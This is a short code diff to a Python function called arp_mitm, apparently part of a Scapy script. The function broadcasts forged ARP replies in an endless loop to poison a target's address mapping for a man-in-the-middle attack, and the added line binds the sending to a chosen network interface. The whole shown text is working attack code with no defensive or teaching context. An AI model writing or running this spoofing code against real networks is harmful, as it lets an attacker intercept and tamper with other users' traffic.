@@ -27,6 +27,7 @@ def arp_mitm(interface, target, interval=10.0):
     sendp(
         Ether(dst="FF:FF:FF:FF:FF:FF") /
         ARP(op="is-at", psrc=target, hwsrc=my_mac),
+        iface=interface,
         inter=interval,
         loop=True
     )
